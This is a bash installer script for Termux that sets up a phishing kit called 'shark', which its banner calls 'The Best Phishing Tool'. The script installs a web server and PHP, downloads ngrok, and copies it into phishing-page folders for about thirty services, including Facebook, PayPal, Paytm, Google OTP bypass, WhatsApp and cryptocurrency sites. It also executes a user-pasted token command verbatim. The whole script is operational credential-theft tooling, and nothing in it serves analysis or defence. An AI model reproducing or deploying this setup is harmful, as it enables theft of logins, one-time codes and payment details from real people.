#!/data/data/com.termux/files/usr/bin/bash
clear
echo 
echo 
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m"
echo
termux-setup-storage
apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install curl -y
apt install zip -y
pkg install wget -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
cp -R ngrok phs/github/
cp -R ngrok phs/Hotstar-otp-bypass/
cp -R ngrok phs/instagram/
cp -R ngrok phs/Linkedin/
cp -R ngrok phs/Netflix/
cp -R ngrok phs/Paytm-Phishing/paytm/
cp -R ngrok phs/Paytm-Phishing/signup/
cp -R ngrok phs/spotify/
cp -R ngrok phs/whatsapp-phishing/
cp -R ngrok phs/facebook/
cp -R ngrok phs/google-otp/
cp -R ngrok phs/instafollow/
cp -R ngrok phs/ipfinder/
cp -R ngrok phs/ola-otpbypass/
cp -R ngrok phs/UberEats-Phishing/
cp -R ngrok phs/Zomato-Phishing/
cp -R ngrok phs/amazonsign/
cp -R ngrok phs/phonepay/
cp -R ngrok phs/paypal/
cp -R ngrok phs/telegram/
cp -R ngrok phs/twitter/
cp -R ngrok phs/flipcart/
cp -R ngrok phs/wordpress/
cp -R ngrok phs/snapchat/
cp -R ngrok phs/protonmail/
cp -R ngrok phs/stackoverflow/
cp -R ngrok phs/ebay/
cp -R ngrok phs/twitch/
cp -R ngrok phs/ajio/
cp -R ngrok phs/cryptocurrency/
cp -R ngrok phs/mobikwik/
cp -R ngrok phs/pinterest/
clear
echo ""
echo ""
echo " "
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit ngrok.com \e[m "
sleep 2
echo " "
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
sleep 1
echo " "
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Paste Your Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token >> /dev/null 2>&1
sleep 1
clear
echo
echo -e "\e[92m[+] Setting up shark \e[m "
echo 
cp -R phs /data/data/com.termux/files/usr/bin
cp -R shark /data/data/com.termux/files/usr/bin
###########XXXXXXXXXXXXX####################
#     JUST LEARNING KEEP SUPPORTING        #
############XXXXXXXXXXXX####################
echo -e "\e[92m[+] To run the tool from anywhere simply type : shark \e[m "
echo 
#####################################
#           THANKYOU                #
#####################################
